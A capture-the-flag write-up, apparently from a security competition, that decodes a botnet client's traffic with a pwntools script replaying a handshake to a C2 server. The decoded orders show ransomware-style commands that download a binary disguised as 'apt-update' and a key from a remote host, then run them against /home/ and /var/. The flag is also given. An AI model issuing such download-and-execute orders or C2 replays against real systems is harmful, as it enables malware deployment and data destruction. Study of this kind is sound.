#### Challenge:

Hi executive senior investigator! 

Cool, you have found the malware dropped on target computer.  According to your defined procedure and your previously detected IoC (indicators of compromise), we were able to find other versions of malware in traffic dumps - we assume it is some kind of botnet client. Unfortunatelly, it looks like the C2 server has been meanwhile upgraded and although the server reacts to client's messages, the client can't decode the orders. You should investigate the communication.  [the_connection.tar.xz](./the_connection.tar.xz ":ignore")

Good luck!

---

#### Solution:

- run the client `./botnet_client -ip '78.128.216.92' -p 20210` and inspect the communication in `wireshark`
- it seems that client send the same message to server, so lets try to reply it and decode the server responses
```python
#!/usr/bin/env python3
from pwn import *
import base64


def parse(msg):
    msg = msg[8:].decode('utf-8')
    time = base64.b64decode(msg)[::-1].decode('utf-8').split('jq')[1]
    return bytes.fromhex(time).decode('utf-8')


while True:
    context.log_level = 'error'
    r = remote('78.128.216.92', 20210)
    r.sendline("\x00\x00\x00\x00\x00\x00\x00\x17\x39\x68\x37\x70\x61\x62\x7a\x75\x79\x64\x76\x33\x31\x78\x6a\x71\x3b\x3b\x72\x65\x61\x64\x79")
    msg = parse(r.recv())
    if 'wait;;' not in msg:
        print(msg)
```

```console
download;;http://challenges.thecatch.cz:20102/ransomvid1984.bin;;/tmp/apt-update
download;;http://challenges.thecatch.cz:20102/key1984.RV20;;/tmp/key
execute;;/tmp/apt-update -k /tmp/key -p /home/
execute;;/tmp/apt-update -k /tmp/key -p /var/
```
- check dumped links for flag
```bash
curl http://challenges.thecatch.cz:20102/ransomvid1984.bin
```

---

<details><summary>FLAG:</summary>

```
FLAG{kT0c-WTfc-S326-Jp1A}
```

</details>
<br/>
